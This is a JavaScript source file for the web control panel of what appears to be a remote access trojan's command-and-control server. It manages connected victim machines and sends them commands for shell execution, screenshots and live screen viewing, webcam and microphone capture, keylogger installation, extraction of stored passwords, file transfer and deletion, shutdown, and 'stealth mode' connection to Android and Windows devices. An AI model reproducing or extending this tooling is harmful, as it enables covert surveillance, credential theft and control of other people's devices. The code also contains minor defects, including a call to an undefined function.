// Client Manager JavaScript

class ClientManager {
    constructor() {
        this.currentClientId = null;
        this.screenShareInterval = null;
        this.commandHistory = [];
        this.selectedFilePath = null;
    }

    // Initialize the client manager
    init() {
        // Load clients on page load
        this.loadClients();
        
        // Setup event listeners
        document.getElementById('refreshClientsBtn').addEventListener('click', () => this.loadClients());
        document.getElementById('closeClientDetails').addEventListener('click', () => this.hideClientDetails());
        document.getElementById('sendCommandBtn').addEventListener('click', () => this.sendCommand());
        document.getElementById('commandInput').addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                this.sendCommand();
            }
        });
        document.getElementById('browseDirectoryBtn').addEventListener('click', () => this.browseDirectory());
        document.getElementById('uploadFileBtn').addEventListener('click', () => this.uploadFile());
        document.getElementById('createFileBtn').addEventListener('click', () => this.createFile());
        
        // Add event listeners for buttons that previously had onclick handlers
        document.getElementById('refreshScreenshotBtn')?.addEventListener('click', () => this.takeScreenshot());
        document.getElementById('takeScreenshotBtn')?.addEventListener('click', () => this.takeScreenshot());
        document.getElementById('toggleScreenShareBtn')?.addEventListener('click', () => this.toggleScreenShare());
        
        document.getElementById('startWebcamBtn')?.addEventListener('click', () => this.toggleWebcam('start'));
        document.getElementById('stopWebcamBtn')?.addEventListener('click', () => this.toggleWebcam('stop'));
        document.getElementById('startMicrophoneBtn')?.addEventListener('click', () => this.toggleMicrophone('start'));
        document.getElementById('stopMicrophoneBtn')?.addEventListener('click', () => this.toggleMicrophone('stop'));
        
        document.getElementById('startKeyloggerBtn')?.addEventListener('click', () => this.toggleKeylogger('start'));
        document.getElementById('stopKeyloggerBtn')?.addEventListener('click', () => this.toggleKeylogger('stop'));
        document.getElementById('checkKeyloggerStatusBtn')?.addEventListener('click', () => this.toggleKeylogger('status'));
        document.getElementById('clearKeylogDataBtn')?.addEventListener('click', () => this.clearKeylogData());
        
        document.getElementById('refreshSystemInfoBtn')?.addEventListener('click', () => this.refreshSystemInfo());
        document.getElementById('shutdownSystemBtn')?.addEventListener('click', () => this.systemAction('shutdown'));
        document.getElementById('restartSystemBtn')?.addEventListener('click', () => this.systemAction('restart'));
        document.getElementById('logoutUserBtn')?.addEventListener('click', () => this.systemAction('logout'));
        
        // Add event listeners for quick command buttons
        document.querySelectorAll('[data-command]').forEach(button => {
            button.addEventListener('click', (e) => {
                const command = e.target.getAttribute('data-command');
                
                // Handle special remote device control commands
                if (command === 'install_keylogger') {
                    this.installKeylogger();
                    return;
                } else if (command === 'start_remote_screen') {
                    this.startRemoteScreen();
                    return;
                } else if (command === 'collect_passwords') {
                    this.collectPasswords();
                    return;
                } else if (command === 'connect_android') {
                    this.connectToDevice('android');
                    return;
                } else if (command === 'connect_windows') {
                    this.connectToDevice('windows');
                    return;
                }
                
                this.quickCommand(command);
            });
        });
        
        // Set up auto-refresh
        setInterval(() => this.loadClients(), 30000); // Refresh client list every 30 seconds
    }

    // Load connected clients
    loadClients() {
        fetch('/api/clients')
            .then(response => response.json())
            .then(clients => {
                const clientList = document.getElementById('clientList');
                const noClientsMessage = document.getElementById('noClientsMessage');
                
                // Clear current list
                clientList.innerHTML = '';
                
                if (clients.length === 0) {
                    noClientsMessage.style.display = 'block';
                    return;
                }
                
                noClientsMessage.style.display = 'none';
                
                // Add each client
                clients.forEach(client => {
                    // Calculate time since last seen
                    const lastSeen = new Date(client.last_seen);
                    const now = new Date();
                    const diffMs = now - lastSeen;
                    const diffMins = Math.floor(diffMs / 60000);
                    
                    // Determine if client is online (seen in last 2 minutes)
                    const isOnline = diffMins < 2;
                    
                    const clientCard = document.createElement('div');
                    clientCard.className = `col-md-4 mb-3`;
                    clientCard.innerHTML = `
                        <div class="card client-card ${isOnline ? '' : 'client-offline'}">
                            <div class="card-body">
                                <h5 class="card-title">
                                    <span class="client-status ${isOnline ? 'status-online' : 'status-offline'}"></span>
                                    ${client.hostname}
                                </h5>
                                <h6 class="card-subtitle mb-2 text-muted">${client.username}@${client.ip_address}</h6>
                                <p class="card-text">
                                    <small>
                                        <i class="fas fa-desktop me-1"></i>${client.platform || 'Unknown'}<br>
                                        <i class="fas fa-clock me-1"></i>Last seen: ${isOnline ? 'Online now' : `${diffMins} minutes ago`}<br>
                                        <i class="fas fa-calendar me-1"></i>Registered: ${new Date(client.registered_at).toLocaleString()}
                                    </small>
                                </p>
                                <div class="client-actions">
                                    <button class="btn btn-sm btn-primary" onclick="clientManager.showClientDetails('${client.client_id}')">
                                        <i class="fas fa-terminal me-1"></i>Control
                                    </button>
                                    <button class="btn btn-sm btn-info" onclick="clientManager.takeQuickScreenshot('${client.client_id}')" ${client.has_screenshot ? '' : 'disabled'}>
                                        <i class="fas fa-camera me-1"></i>Screenshot
                                    </button>
                                    <button class="btn btn-sm btn-danger" onclick="clientManager.disconnectClient('${client.client_id}')">
                                        <i class="fas fa-times-circle me-1"></i>Disconnect
                                    </button>
                                </div>
                            </div>
                        </div>
                    `;
                    
                    clientList.appendChild(clientCard);
                });
            })
            .catch(error => {
                console.error('Error loading clients:', error);
                this.showAlert('Error', 'Failed to load clients. Please try again.');
            });
    }

    // Show client details
    showClientDetails(clientId) {
        this.currentClientId = clientId;
        
        // Show the details panel
        document.getElementById('clientDetails').style.display = 'block';
        document.getElementById('clientDetailTitle').textContent = clientId;
        
        // Scroll to the details
        document.getElementById('clientDetails').scrollIntoView({ behavior: 'smooth' });
        
        // Load client info
        this.loadClientInfo(clientId);
        
        // Reset tabs
        document.getElementById('terminalOutput').innerHTML = '';
        document.getElementById('keylogData').innerHTML = '<p class="text-muted">No keylog data available</p>';
        document.getElementById('screenshotImage').src = '/static/img/no-screenshot.png';
        document.getElementById('screenshotTimestamp').textContent = 'Never';
        document.getElementById('fileList').innerHTML = '<tr><td colspan="4" class="text-center">No files loaded</td></tr>';
        
        // Stop any active screen share
        this.stopScreenShare();
    }

    // Hide client details
    hideClientDetails() {
        document.getElementById('clientDetails').style.display = 'none';
        this.currentClientId = null;
        
        // Stop any active screen share
        this.stopScreenShare();
    }

    // Load client information
    loadClientInfo(clientId) {
        fetch(`/api/client/${clientId}`)
            .then(response => response.json())
            .then(info => {
                const systemInfoTable = document.getElementById('systemInfoTable');
                systemInfoTable.innerHTML = '';
                
                // Add each property to the table
                const properties = [
                    { key: 'hostname', label: 'Hostname' },
                    { key: 'username', label: 'Username' },
                    { key: 'platform', label: 'Operating System' },
                    { key: 'platform_release', label: 'OS Release' },
                    { key: 'platform_version', label: 'OS Version' },
                    { key: 'architecture', label: 'Architecture' },
                    { key: 'processor', label: 'Processor' },
                    { key: 'ip_address', label: 'IP Address' },
                    { key: 'mac_address', label: 'MAC Address' },
                    { key: 'last_seen', label: 'Last Seen' },
                    { key: 'registered_at', label: 'Registered' }
                ];
                
                properties.forEach(prop => {
                    if (info[prop.key]) {
                        const row = document.createElement('tr');
                        row.innerHTML = `
                            <td><strong>${prop.label}</strong></td>
                            <td>${info[prop.key]}</td>
                        `;
                        systemInfoTable.appendChild(row);
                    }
                });
                
                // Check if screenshot is available
                if (info.has_screenshot) {
                    document.getElementById('screenshotTimestamp').textContent = new Date(info.screenshot_timestamp).toLocaleString();
                    this.takeScreenshot(); // Load the screenshot
                }
            })
            .catch(error => {
                console.error('Error loading client info:', error);
                this.showAlert('Error', 'Failed to load client information.');
            });
    }

    // Refresh system info
    refreshSystemInfo() {
        if (!this.currentClientId) return;
        
        this.sendClientCommand('system_info', {})
            .then(result => {
                if (result.success && result.result.success) {
                    const info = result.result.info;
                    const systemInfoTable = document.getElementById('systemInfoTable');
                    systemInfoTable.innerHTML = '';
                    
                    // Add each property to the table
                    for (const [key, value] of Object.entries(info)) {
                        const row = document.createElement('tr');
                        row.innerHTML = `
                            <td><strong>${key.replace('_', ' ').toUpperCase()}</strong></td>
                            <td>${value}</td>
                        `;
                        systemInfoTable.appendChild(row);
                    }
                    
                    this.showAlert('Success', 'System information refreshed successfully.');
                } else {
                    this.showAlert('Error', 'Failed to refresh system information.');
                }
            })
            .catch(error => {
                console.error('Error refreshing system info:', error);
                this.showAlert('Error', 'Failed to refresh system information.');
            });
    }

    // System action (shutdown, restart, logout)
    systemAction(action) {
        if (!this.currentClientId) return;
        
        if (!confirm(`Are you sure you want to ${action} the remote system?`)) {
            return;
        }
        
        this.sendClientCommand('system_action', { action: action })
            .then(result => {
                if (result.success && result.result.success) {
                    this.showAlert('Success', `System ${action} initiated successfully.`);
                } else {
                    this.showAlert('Error', `Failed to ${action} system.`);
                }
            })
            .catch(error => {
                console.error(`Error executing ${action}:`, error);
                this.showAlert('Error', `Failed to ${action} system.`);
            });
    }

    // Send command to terminal
    sendCommand() {
        if (!this.currentClientId) return;
        
        const commandInput = document.getElementById('commandInput');
        const command = commandInput.value.trim();
        
        if (!command) return;
        
        // Add command to terminal
        const terminalOutput = document.getElementById('terminalOutput');
        terminalOutput.innerHTML += `<div style="color: #00ff00;">$ ${command}</div>`;
        
        // Clear input
        commandInput.value = '';
        
        // Add to history
        this.commandHistory.push(command);
        this.updateCommandHistory();
        
        // Send command to client
        this.sendClientCommand('execute', { command: command })
            .then(result => {
                if (result.success && result.result.success) {
                    const cmdResult = result.result.result;
                    let output = '';
                    
                    if (cmdResult.stdout) {
                        output += cmdResult.stdout;
                    }
                    
                    if (cmdResult.stderr) {
                        output += `<span style="color: #ff0000;">${cmdResult.stderr}</span>`;
                    }
                    
                    if (output) {
                        terminalOutput.innerHTML += `<div style="white-space: pre-wrap;">${output}</div>`;
                    } else {
                        terminalOutput.innerHTML += `<div><i>Command executed with no output</i></div>`;
                    }
                } else {
                    terminalOutput.innerHTML += `<div style="color: #ff0000;">Error executing command: ${result.error || 'Unknown error'}</div>`;
                }
                
                // Scroll to bottom
                terminalOutput.scrollTop = terminalOutput.scrollHeight;
            })
            .catch(error => {
                console.error('Error sending command:', error);
                terminalOutput.innerHTML += `<div style="color: #ff0000;">Error sending command: ${error.message}</div>`;
                terminalOutput.scrollTop = terminalOutput.scrollHeight;
            });
    }

    // Quick command
    quickCommand(command) {
        document.getElementById('commandInput').value = command;
        this.sendCommand();
    }

    // Update command history display
    updateCommandHistory() {
        const historyElement = document.getElementById('commandHistory');
        
        if (this.commandHistory.length === 0) {
            historyElement.innerHTML = '<p class="text-muted">No commands executed yet</p>';
            return;
        }
        
        historyElement.innerHTML = '';
        
        // Show last 10 commands
        const recentCommands = this.commandHistory.slice(-10).reverse();
        
        recentCommands.forEach(cmd => {
            const cmdElement = document.createElement('div');
            cmdElement.className = 'mb-1';
            cmdElement.innerHTML = `
                <button class="btn btn-sm btn-link p-0" onclick="document.getElementById('commandInput').value = '${cmd.replace(/'/g, "\\'")}'">
                    ${cmd}
                </button>
            `;
            historyElement.appendChild(cmdElement);
        });
    }

    // Take screenshot
    takeScreenshot() {
        if (!this.currentClientId) return;
        
        this.sendClientCommand('screenshot', { action: 'take' })
            .then(result => {
                if (result.success && result.result.success) {
                    const imgData = result.result.image;
                    document.getElementById('screenshotImage').src = `data:image/png;base64,${imgData}`;
                    document.getElementById('screenshotTimestamp').textContent = new Date().toLocaleString();
                } else {
                    this.showAlert('Error', 'Failed to take screenshot.');
                }
            })
            .catch(error => {
                console.error('Error taking screenshot:', error);
                this.showAlert('Error', 'Failed to take screenshot.');
            });
    }

    // Take quick screenshot (from client list)
    takeQuickScreenshot(clientId) {
        fetch(`/api/client/${clientId}/screenshot`)
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    // Create modal to show screenshot
                    const modal = document.createElement('div');
                    modal.className = 'modal fade';
                    modal.id = 'screenshotModal';
                    modal.tabIndex = '-1';
                    modal.innerHTML = `
                        <div class="modal-dialog modal-lg">
                            <div class="modal-content">
                                <div class="modal-header">
                                    <h5 class="modal-title">Screenshot from ${clientId}</h5>
                                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                                </div>
                                <div class="modal-body">
                                    <img src="data:image/png;base64,${data.image}" class="img-fluid" alt="Screenshot">
                                    <p class="text-muted mt-2">
                                        <small>Taken: ${new Date(data.timestamp).toLocaleString()}</small>
                                    </p>
                                </div>
                                <div class="modal-footer">
                                    <button type="button" class="btn btn-primary" onclick="clientManager.showClientDetails('${clientId}')">Control This Client</button>
                                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                                </div>
                            </div>
                        </div>
                    `;
                    
                    document.body.appendChild(modal);
                    
                    // Show modal
                    const modalInstance = new bootstrap.Modal(modal);
                    modalInstance.show();
                    
                    // Remove modal when hidden
                    modal.addEventListener('hidden.bs.modal', function() {
                        document.body.removeChild(modal);
                    });
                } else {
                    this.showAlert('Error', 'Failed to get screenshot.');
                }
            })
            .catch(error => {
                console.error('Error getting screenshot:', error);
                this.showAlert('Error', 'Failed to get screenshot.');
            });
    }

    // Toggle screen share
    toggleScreenShare() {
        if (!this.currentClientId) return;
        
        const toggleBtn = document.getElementById('toggleScreenShareBtn');
        
        if (this.screenShareInterval) {
            // Stop screen share
            this.stopScreenShare();
        } else {
            // Start screen share
            toggleBtn.innerHTML = '<i class="fas fa-stop me-1"></i>Stop Live View';
            toggleBtn.classList.remove('btn-success');
            toggleBtn.classList.add('btn-danger');
            
            // Take initial screenshot
            this.takeScreenshot();
            
            // Set interval to take screenshots
            this.screenShareInterval = setInterval(() => this.takeScreenshot(), 2000);
        }
    }

    // Stop screen share
    stopScreenShare() {
        if (this.screenShareInterval) {
            clearInterval(this.screenShareInterval);
            this.screenShareInterval = null;
            
            const toggleBtn = document.getElementById('toggleScreenShareBtn');
            toggleBtn.innerHTML = '<i class="fas fa-play me-1"></i>Start Live View';
            toggleBtn.classList.remove('btn-danger');
            toggleBtn.classList.add('btn-success');
        }
    }

    // Toggle keylogger
    toggleKeylogger(action) {
        if (!this.currentClientId) return;
        
        this.sendClientCommand('keylogger', { action: action })
            .then(result => {
                if (result.success && result.result.success) {
                    if (action === 'status') {
                        const status = result.result.active ? 'active' : 'inactive';
                        this.showAlert('Keylogger Status', `Keylogger is currently ${status}.`);
                    } else {
                        this.showAlert('Success', result.result.message);
                    }
                } else {
                    this.showAlert('Error', `Failed to ${action} keylogger.`);
                }
            })
            .catch(error => {
                console.error(`Error ${action} keylogger:`, error);
                this.showAlert('Error', `Failed to ${action} keylogger.`);
            });
    }

    // Clear keylog data
    clearKeylogData() {
        document.getElementById('keylogData').innerHTML = '<p class="text-muted">No keylog data available</p>';
    }

    // Toggle webcam
    toggleWebcam(action) {
        if (!this.currentClientId) return;
        
        this.sendClientCommand('webcam', { action: action })
            .then(result => {
                if (result.success && result.result.success) {
                    this.showAlert('Success', result.result.message);
                } else {
                    this.showAlert('Error', `Failed to ${action} webcam.`);
                }
            })
            .catch(error => {
                console.error(`Error ${action} webcam:`, error);
                this.showAlert('Error', `Failed to ${action} webcam.`);
            });
    }

    // Toggle microphone
    toggleMicrophone(action) {
        if (!this.currentClientId) return;
        
        this.sendClientCommand('microphone', { action: action })
            .then(result => {
                if (result.success && result.result.success) {
                    this.showAlert('Success', result.result.message);
                } else {
                    this.showAlert('Error', `Failed to ${action} microphone.`);
                }
            })
            .catch(error => {
                console.error(`Error ${action} microphone:`, error);
                this.showAlert('Error', `Failed to ${action} microphone.`);
            });
    }

    // Browse directory
    browseDirectory() {
        if (!this.currentClientId) return;
        
        const path = document.getElementById('directoryPath').value.trim();
        
        if (!path) {
            this.showAlert('Error', 'Please enter a directory path.');
            return;
        }
        
        this.sendClientCommand('file_browse', { path: path })
            .then(result => {
                if (result.success && result.result.success) {
                    const files = result.result.files;
                    const fileList = document.getElementById('fileList');
                    
                    fileList.innerHTML = '';
                    
                    if (files.length === 0) {
                        fileList.innerHTML = '<tr><td colspan="4" class="text-center">No files found</td></tr>';
                        return;
                    }
                    
                    files.forEach(file => {
                        const row = document.createElement('tr');
                        row.innerHTML = `
                            <td>
                                <i class="fas ${file.is_dir ? 'fa-folder text-warning' : 'fa-file text-primary'} me-2"></i>
                                ${file.name}
                            </td>
                            <td>${file.is_dir ? 'Directory' : file.type}</td>
                            <td>${file.is_dir ? '-' : this.formatBytes(file.size)}</td>
                            <td>
                                ${file.is_dir ? 
                                    `<button class="btn btn-sm btn-outline-primary" onclick="clientManager.browseToDirectory('${file.path}')">
                                        <i class="fas fa-folder-open"></i>
                                    </button>` : 
                                    `<button class="btn btn-sm btn-outline-success" onclick="clientManager.selectFile('${file.path}')">
                                        <i class="fas fa-check"></i>
                                    </button>`
                                }
                            </td>
                        `;
                        fileList.appendChild(row);
                    });
                } else {
                    this.showAlert('Error', 'Failed to browse directory.');
                }
            })
            .catch(error => {
                console.error('Error browsing directory:', error);
                this.showAlert('Error', 'Failed to browse directory.');
            });
    }

    // Browse to directory
    browseToDirectory(path) {
        document.getElementById('directoryPath').value = path;
        this.browseDirectory();
    }

    // Select file
    selectFile(path) {
        this.selectedFilePath = path;
        document.getElementById('downloadFileBtn').disabled = false;
        document.getElementById('deleteFileBtn').disabled = false;
    }

    // Format bytes
    formatBytes(bytes) {
        if (bytes === 0) return '0 Bytes';
        const k = 1024;
        const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
    }

    // Upload file
    uploadFile() {
        if (!this.currentClientId) return;
        
        const fileInput = document.getElementById('fileToUpload');
        const destination = document.getElementById('uploadDestination').value.trim();
        
        if (!fileInput.files[0]) {
            this.showAlert('Error', 'Please select a file to upload.');
            return;
        }
        
        if (!destination) {
            this.showAlert('Error', 'Please enter a destination path.');
            return;
        }
        
        const reader = new FileReader();
        reader.onload = (e) => {
            const fileContent = e.target.result.split(',')[1]; // Get base64 content
            
            this.sendClientCommand('file_upload', {
                path: destination,
                filename: fileInput.files[0].name,
                content: fileContent
            })
            .then(result => {
                if (result.success && result.result.success) {
                    this.showAlert('Success', 'File uploaded successfully.');
                    // Close modal
                    const modal = bootstrap.Modal.getInstance(document.getElementById('uploadFileModal'));
                    modal.hide();
                    // Refresh directory
                    this.browseDirectory();
                } else {
                    this.showAlert('Error', 'Failed to upload file.');
                }
            })
            .catch(error => {
                console.error('Error uploading file:', error);
                this.showAlert('Error', 'Failed to upload file.');
            });
        };
        reader.readAsDataURL(fileInput.files[0]);
    }

    // Create file
    createFile() {
        if (!this.currentClientId) return;
        
        const filePath = document.getElementById('createFilePath').value.trim();
        const fileContent = document.getElementById('createFileContent').value;
        
        if (!filePath) {
            this.showAlert('Error', 'Please enter a file path.');
            return;
        }
        
        this.sendClientCommand('file_create', {
            path: filePath,
            content: fileContent
        })
        .then(result => {
            if (result.success && result.result.success) {
                this.showAlert('Success', 'File created successfully.');
                // Close modal
                const modal = bootstrap.Modal.getInstance(document.getElementById('createFileModal'));
                modal.hide();
                // Refresh directory
                this.browseDirectory();
            } else {
                this.showAlert('Error', 'Failed to create file.');
            }
        })
        .catch(error => {
            console.error('Error creating file:', error);
            this.showAlert('Error', 'Failed to create file.');
        });
    }

    // Disconnect client
    disconnectClient(clientId) {
        if (!confirm('Are you sure you want to disconnect this client?')) {
            return;
        }
        
        fetch(`/api/client/${clientId}/disconnect`, {
            method: 'POST'
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                this.showAlert('Success', 'Client disconnected successfully.');
                this.loadClients();
                
                // If this is the current client, hide details
                if (clientId === this.currentClientId) {
                    this.hideClientDetails();
                }
            } else {
                this.showAlert('Error', 'Failed to disconnect client.');
            }
        })
        .catch(error => {
            console.error('Error disconnecting client:', error);
            this.showAlert('Error', 'Failed to disconnect client.');
        });
    }

    // Send command to client
    sendClientCommand(type, params) {
        return fetch(`/api/client/${this.currentClientId}/command`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                type: type,
                params: params
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                // Wait for command result
                return this.waitForCommandResult(data.command_id);
            } else {
                throw new Error(data.error || 'Unknown error');
            }
        });
    }

    // Wait for command result
    waitForCommandResult(commandId, attempts = 0) {
        return new Promise((resolve, reject) => {
            // Max 10 attempts (10 seconds)
            if (attempts >= 10) {
                reject(new Error('Command timed out'));
                return;
            }
            
            // Wait 1 second before checking
            setTimeout(() => {
                fetch(`/api/command/${commandId}/result`)
                    .then(response => response.json())
                    .then(data => {
                        if (data.success) {
                            resolve(data);
                        } else if (data.error === 'Command result not found') {
                            // Try again
                            return this.waitForCommandResult(commandId, attempts + 1);
                        } else {
                            reject(new Error(data.error || 'Unknown error'));
                        }
                    })
                    .catch(error => {
                        reject(error);
                    });
            }, 1000);
        });
    }

    // Show alert
    showAlert(title, message) {
        const alertModal = document.getElementById('alertModal');
        document.getElementById('alertTitle').textContent = title;
        document.getElementById('alertMessage').textContent = message;
        
        const modal = new bootstrap.Modal(alertModal);
        modal.show();
    }
    
    // Install keylogger on remote device
    installKeylogger() {
        if (!this.currentClientId) {
            this.showAlert('Error', 'No client selected');
            return;
        }
        
        if (confirm('Are you sure you want to install a keylogger on this device? This will collect all keystrokes.')) {
            this.showAlert('Installing Keylogger', 'Attempting to install keylogger on remote device...');
            
            this.sendClientCommand('install_keylogger', {})
                .then(result => {
                    if (result.success) {
                        this.showAlert('Success', 'Keylogger installed successfully. Use the Keylogger tab to view captured data.');
                        // Automatically switch to keylogger tab
                        document.querySelector('a[href="#keylogger"]').click();
                        // Start the keylogger
                        this.toggleKeylogger('start');
                    } else {
                        this.showAlert('Error', `Failed to install keylogger: ${result.error || 'Unknown error'}`);
                    }
                })
                .catch(error => {
                    console.error('Error installing keylogger:', error);
                    this.showAlert('Error', `Failed to install keylogger: ${error.message}`);
                });
        }
    }
    
    // Start remote screen control
    startRemoteScreen() {
        if (!this.currentClientId) {
            this.showAlert('Error', 'No client selected');
            return;
        }
        
        this.showAlert('Starting Remote Screen', 'Attempting to start remote screen control...');
        
        this.sendClientCommand('start_remote_screen', {})
            .then(result => {
                if (result.success) {
                    this.showAlert('Success', 'Remote screen control started. You can now view and control the remote screen.');
                    // Start screen sharing with faster refresh rate for control
                    this.toggleScreenShare(true, 500); // 500ms refresh rate for better control
                    
                    // Enable mouse and keyboard control on the screenshot
                    const screenshotImg = document.getElementById('screenshotImg');
                    if (screenshotImg) {
                        screenshotImg.style.cursor = 'crosshair';
                        screenshotImg.onclick = (e) => this.handleRemoteClick(e);
                    }
                } else {
                    this.showAlert('Error', `Failed to start remote screen control: ${result.error || 'Unknown error'}`);
                }
            })
            .catch(error => {
                console.error('Error starting remote screen control:', error);
                this.showAlert('Error', `Failed to start remote screen control: ${error.message}`);
            });
    }
    
    // Handle remote click on screenshot
    handleRemoteClick(event) {
        const img = event.target;
        const rect = img.getBoundingClientRect();
        
        // Calculate relative position within the image
        const x = Math.round((event.clientX - rect.left) / rect.width * 100);
        const y = Math.round((event.clientY - rect.top) / rect.height * 100);
        
        // Send mouse click command to remote device
        this.sendClientCommand('mouse_control', {
            action: 'click',
            x: x,
            y: y
        })
        .then(result => {
            if (!result.success) {
                console.error('Remote click failed:', result.error);
            }
        })
        .catch(error => {
            console.error('Error sending remote click:', error);
        });
    }
    
    // Collect passwords from remote device
    collectPasswords() {
        if (!this.currentClientId) {
            this.showAlert('Error', 'No client selected');
            return;
        }
        
        if (confirm('Are you sure you want to collect passwords from this device? This will attempt to extract stored credentials.')) {
            this.showAlert('Collecting Passwords', 'Attempting to collect passwords from remote device...');
            
            this.sendClientCommand('collect_passwords', {})
                .then(result => {
                    if (result.success) {
                        // Display the collected passwords
                        const passwordData = result.data || 'No passwords found';
                        const formattedData = typeof passwordData === 'object' ? 
                            JSON.stringify(passwordData, null, 2) : passwordData;
                        
                        // Show in keylogger tab
                        const keyloggerContent = document.getElementById('keyloggerContent');
                        if (keyloggerContent) {
                            keyloggerContent.innerHTML = '<h5>Collected Passwords</h5><pre>' + 
                                formattedData + '</pre>' + keyloggerContent.innerHTML;
                        }
                        
                        this.showAlert('Success', 'Passwords collected successfully. View them in the Keylogger tab.');
                        // Switch to keylogger tab
                        document.querySelector('a[href="#keylogger"]').click();
                    } else {
                        this.showAlert('Error', `Failed to collect passwords: ${result.error || 'Unknown error'}`);
                    }
                })
                .catch(error => {
                    console.error('Error collecting passwords:', error);
                    this.showAlert('Error', `Failed to collect passwords: ${error.message}`);
                });
        }
    }
    
    // Connect to a specific device type
    connectToDevice(deviceType) {
        // Show connection modal
        const modalTitle = deviceType === 'android' ? 'Connect to Android Device' : 'Connect to Windows Device';
        this.showAlert(modalTitle, 'Enter the IP address or hostname of the device you want to connect to:');
        
        // Create a custom modal for device connection
        const modalHtml = `
            <div class="modal fade" id="connectDeviceModal" tabindex="-1" aria-hidden="true">
                <div class="modal-dialog">
                    <div class="modal-content">
                        <div class="modal-header">
                            <h5 class="modal-title">Connect to ${deviceType.charAt(0).toUpperCase() + deviceType.slice(1)} Device</h5>
                            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                        </div>
                        <div class="modal-body">
                            <form id="connectDeviceForm">
                                <div class="mb-3">
                                    <label for="deviceAddress" class="form-label">Device Address</label>
                                    <input type="text" class="form-control" id="deviceAddress" placeholder="IP address or hostname" required>
                                </div>
                                <div class="mb-3">
                                    <label for="devicePort" class="form-label">Port</label>
                                    <input type="number" class="form-control" id="devicePort" value="${deviceType === 'android' ? '5555' : '8080'}" required>
                                </div>
                                <div class="mb-3 form-check">
                                    <input type="checkbox" class="form-check-input" id="stealthMode" checked>
                                    <label class="form-check-label" for="stealthMode">Connect in stealth mode</label>
                                </div>
                            </form>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                            <button type="button" class="btn btn-danger" id="connectDeviceBtn">Connect</button>
                        </div>
                    </div>
                </div>
            </div>
        `;
        
        // Add modal to the DOM
        const modalContainer = document.createElement('div');
        modalContainer.innerHTML = modalHtml;
        document.body.appendChild(modalContainer);
        
        // Show the modal
        const modal = new bootstrap.Modal(document.getElementById('connectDeviceModal'));
        modal.show();
        
        // Handle connect button click
        document.getElementById('connectDeviceBtn').addEventListener('click', () => {
            const address = document.getElementById('deviceAddress').value;
            const port = document.getElementById('devicePort').value;
            const stealth = document.getElementById('stealthMode').checked;
            
            if (!address) {
                alert('Please enter a valid address');
                return;
            }
            
            // Hide the modal
            modal.hide();
            
            // Show connecting message
            this.showAlert('Connecting', `Attempting to connect to ${deviceType} device at ${address}:${port}...`);
            
            // Send connection command
            this.sendClientCommand('connect_device', {
                device_type: deviceType,
                address: address,
                port: port,
                stealth_mode: stealth
            })
            .then(result => {
                if (result.success) {
                    this.showAlert('Success', `Successfully connected to ${deviceType} device. The device is now under control.`);
                    // Refresh client list to show the new connection
                    this.loadConnectedClients();
                } else {
                    this.showAlert('Error', `Failed to connect to device: ${result.error || 'Unknown error'}`);
                }
            })
            .catch(error => {
                console.error(`Error connecting to ${deviceType} device:`, error);
                this.showAlert('Error', `Failed to connect to device: ${error.message}`);
            });
            
            // Remove the modal from DOM after it's hidden
            document.getElementById('connectDeviceModal').addEventListener('hidden.bs.modal', function () {
                document.body.removeChild(modalContainer);
            });
        });
    }
}

// Initialize client manager when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    window.clientManager = new ClientManager();
    window.clientManager.init();
});

// Global functions for HTML onclick handlers
function refreshSystemInfo() {
    window.clientManager.refreshSystemInfo();
}

function systemAction(action) {
    window.clientManager.systemAction(action);
}

function quickCommand(command) {
    window.clientManager.quickCommand(command);
}

function takeScreenshot() {
    window.clientManager.takeScreenshot();
}

function toggleScreenShare() {
    window.clientManager.toggleScreenShare();
}

function toggleKeylogger(action) {
    window.clientManager.toggleKeylogger(action);
}

function clearKeylogData() {
    window.clientManager.clearKeylogData();
}

function toggleWebcam(action) {
    window.clientManager.toggleWebcam(action);
}

function toggleMicrophone(action) {
    window.clientManager.toggleMicrophone(action);
}

function browseToDirectory(path) {
    window.clientManager.browseToDirectory(path);
}

function selectFile(path) {
    window.clientManager.selectFile(path);
}

function showClientDetails(clientId) {
    window.clientManager.showClientDetails(clientId);
}

function hideClientDetails() {
    window.clientManager.hideClientDetails();
}

function disconnectClient(clientId) {
    window.clientManager.disconnectClient(clientId);
}

function installKeylogger() {
    window.clientManager.installKeylogger();
}

function startRemoteScreen() {
    window.clientManager.startRemoteScreen();
}

function collectPasswords() {
    window.clientManager.collectPasswords();
}

function connectToDevice(deviceType) {
    window.clientManager.connectToDevice(deviceType);
}

function takeQuickScreenshot(clientId) {
    window.clientManager.takeQuickScreenshot(clientId);
}

function uploadFile() {
    window.clientManager.uploadFile();
}

function createFile() {
    window.clientManager.createFile();
}

function sendCommand() {
    window.clientManager.sendCommand();
}

function browseDirectory() {
    window.clientManager.browseDirectory();
}